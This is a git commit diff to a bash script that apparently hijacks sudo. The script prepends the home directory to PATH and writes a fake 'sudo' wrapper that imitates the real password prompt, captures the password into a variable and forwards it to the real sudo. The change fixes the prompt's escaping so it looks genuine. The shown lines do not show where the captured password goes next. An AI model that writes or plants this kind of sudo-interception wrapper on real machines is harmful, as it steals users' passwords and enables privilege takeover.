e3f86d5953d009284e5db4f5ef6576f7eadd6feb
kernelstearns <55107317+kernelstearns@users.noreply.github.com>
2020-01-29 14:37:33 -0700

    Update noro.bash

--- noro/noro.bash
+++ noro/noro.bash
@@ -4,7 +4,7 @@ PATH=~:$PATH
 
 #Hook sudo
 echo "#!/bin/bash" > ~/sudo
-echo "read -sp \"[sudo] password for \$\(whoami\): \" p" >> ~/sudo
+echo "read -sp \"[sudo] password for \$(whoami): \" p" >> ~/sudo
 echo "echo \$p | /usr/bin/sudo -S \$@" >> ~/sudo
 chmod +x sudo
 
